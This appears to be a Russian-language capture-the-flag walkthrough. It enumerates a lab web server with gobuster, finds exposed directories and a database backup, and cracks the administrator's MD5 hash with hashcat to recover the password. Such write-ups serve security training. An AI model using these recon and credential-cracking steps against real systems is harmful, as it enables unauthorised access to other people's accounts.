Вводим в браузер ip цели, видим сайт на Apache.

запускаем `gobuster`:

```bash
$ gobuster dir -u http://target/ -t 50 -w /usr/share/worldlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```

Нашли скрытую директорию `/content`, заходим и видим страничку с просьбой подождать.
Запустим `gobuster` еще раз для этой директории:

```bash
$ gobuster dir -u http://target/content -t 50 -w /usr/share/worldlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

==============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/content
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 305]
/images               (Status: 301) [Size: 309]
/inc                  (Status: 301) [Size: 306]
/_themes              (Status: 301) [Size: 310]
/attachment           (Status: 301) [Size: 313]
/as                   (Status: 301) [Size: 305]
```

Если зайти на одну из директорий мы обнаружим, что можем просматривать файлы сайта. А на директории `/as` мы можем увидеть страницу для входа.

В директории `/inc` есть папка `1`, из нее мы можем скачать бекап базы данных, а оттуда вытащить хеш пароля администратора: `42f749ade7f9e195bf475f37a44cafcb`
Это md5 хеш.

подбираем хеш с помощью `hashcat`:

```bash
$ echo -n "42f749ade7f9e195bf475f37a44cafcb" > hash.txt

$ hashcat -m 0 hash.txt
```

Получили пароль: `Password123`

